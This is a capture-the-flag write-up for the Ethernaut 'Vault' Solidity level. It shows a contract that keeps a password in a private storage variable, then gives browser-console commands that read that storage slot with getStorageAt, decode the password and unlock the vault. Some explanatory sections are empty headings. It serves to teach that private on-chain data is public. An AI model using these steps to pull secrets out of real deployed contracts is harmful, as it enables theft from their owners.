<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

Challange's message.

>Unlock the vault to pass the level!

We have an contract which has type of bool variable called **locked** and type of **bytes** variable named **_password_** that defined in constructor(). What is more, there is **unlock()** function which checks _password we entered. If we entered correct password, unlocked will be **false** so we will beat this level.

## Smart Contract's Storage

Each smart contract running in the Ethereum Virtual Machine (EVM) maintains state in its own permanent storage. This storage can be thought of as a very large array, initially full of zeros. Each value in the array is 32-bytes wide, and there are 2256 such values. A smart contract can read from or write to a value at any location. That’s the extent of the storage interface.

<img src="https://programtheblockchain.com/storage/storage.png">

```solidity
contract StorageTest {
    uint256 a;
    bytes32 b;
}
```

In the above code:


## Accessing Private Variabes In Storage



# Subverting

```shell
await contract.locked()
true
```

```shell
var pass = await web3.eth.getStorageAt(contract.address,1,console.log)
```

```shell
await web3.utils.hexToUtf8(pass)
'A very strong secret password :)'
```
```shell
await contract.unlock(pass)
```
```shell
await contract.locked()
false
```

**_by wasnyps_**
